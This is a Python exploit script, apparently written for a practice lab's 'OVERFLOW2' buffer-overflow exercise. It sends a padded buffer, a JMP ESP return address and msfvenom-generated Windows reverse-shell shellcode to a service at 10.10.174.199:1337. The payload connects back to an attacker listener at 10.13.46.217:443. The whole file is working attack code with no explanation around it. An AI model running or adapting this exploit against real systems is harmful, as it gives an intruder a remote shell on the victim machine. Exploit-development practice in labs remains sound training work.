#!/usr/bin/python

import sys
import socket, time
from struct import *


remoteip="10.10.174.199"
remoteport=1337
offset = "A" * 634
#!mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"
#625011AF
eip = "\xaf\x11\x50\x62"

#msfvenom -p windows/shell_reverse_tcp lhost=10.13.46.217 lport=443 exitfunc=thread -b "\x00\x23\x3c\x83\xba" -v esp -f python
esp =  b""
esp += b"\xfc\xbb\x2f\xd6\x45\xdd\xeb\x0c\x5e\x56\x31\x1e\xad"
esp += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xd3"
esp += b"\x3e\xc7\xdd\x2b\xbf\xa8\x54\xce\x8e\xe8\x03\x9b\xa1"
esp += b"\xd8\x40\xc9\x4d\x92\x05\xf9\xc6\xd6\x81\x0e\x6e\x5c"
esp += b"\xf4\x21\x6f\xcd\xc4\x20\xf3\x0c\x19\x82\xca\xde\x6c"
esp += b"\xc3\x0b\x02\x9c\x91\xc4\x48\x33\x05\x60\x04\x88\xae"
esp += b"\x3a\x88\x88\x53\x8a\xab\xb9\xc2\x80\xf5\x19\xe5\x45"
esp += b"\x8e\x13\xfd\x8a\xab\xea\x76\x78\x47\xed\x5e\xb0\xa8"
esp += b"\x42\x9f\x7c\x5b\x9a\xd8\xbb\x84\xe9\x10\xb8\x39\xea"
esp += b"\xe7\xc2\xe5\x7f\xf3\x65\x6d\x27\xdf\x94\xa2\xbe\x94"
esp += b"\x9b\x0f\xb4\xf2\xbf\x8e\x19\x89\xc4\x1b\x9c\x5d\x4d"
esp += b"\x5f\xbb\x79\x15\x3b\xa2\xd8\xf3\xea\xdb\x3a\x5c\x52"
esp += b"\x7e\x31\x71\x87\xf3\x18\x1e\x64\x3e\xa2\xde\xe2\x49"
esp += b"\xd1\xec\xad\xe1\x7d\x5d\x25\x2c\x7a\xa2\x1c\x88\x14"
esp += b"\x5d\x9f\xe9\x3d\x9a\xcb\xb9\x55\x0b\x74\x52\xa5\xb4"
esp += b"\xa1\xf5\xf5\x1a\x1a\xb6\xa5\xda\xca\x5e\xaf\xd4\x35"
esp += b"\x7e\xd0\x3e\x5e\x15\x2b\xa9\x6b\xe7\x1d\xf0\x04\xf5"
esp += b"\x61\x03\x6e\x70\x87\x69\x80\xd5\x10\x06\x39\x7c\xea"
esp += b"\xb7\xc6\xaa\x97\xf8\x4d\x59\x68\xb6\xa5\x14\x7a\x2f"
esp += b"\x46\x63\x20\xe6\x59\x59\x4c\x64\xcb\x06\x8c\xe3\xf0"
esp += b"\x90\xdb\xa4\xc7\xe8\x89\x58\x71\x43\xaf\xa0\xe7\xac"
esp += b"\x6b\x7f\xd4\x33\x72\xf2\x60\x10\x64\xca\x69\x1c\xd0"
esp += b"\x82\x3f\xca\x8e\x64\x96\xbc\x78\x3f\x45\x17\xec\xc6"
esp += b"\xa5\xa8\x6a\xc7\xe3\x5e\x92\x76\x5a\x27\xad\xb7\x0a"
esp += b"\xaf\xd6\xa5\xaa\x50\x0d\x6e\xca\xb2\x87\x9b\x63\x6b"
esp += b"\x42\x26\xee\x8c\xb9\x65\x17\x0f\x4b\x16\xec\x0f\x3e"
esp += b"\x13\xa8\x97\xd3\x69\xa1\x7d\xd3\xde\xc2\x57\xd3\xe0"
esp += b"\x3c\x58"

buffer = offset + eip + esp

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((remoteip, remoteport))
print ("Send Evil buffer!")
print s.recv(1024)
s.send("OVERFLOW2 " + buffer + '\r\n')
print s.recv(1024)
s.close()
time.sleep(1)
print "-------------------------"
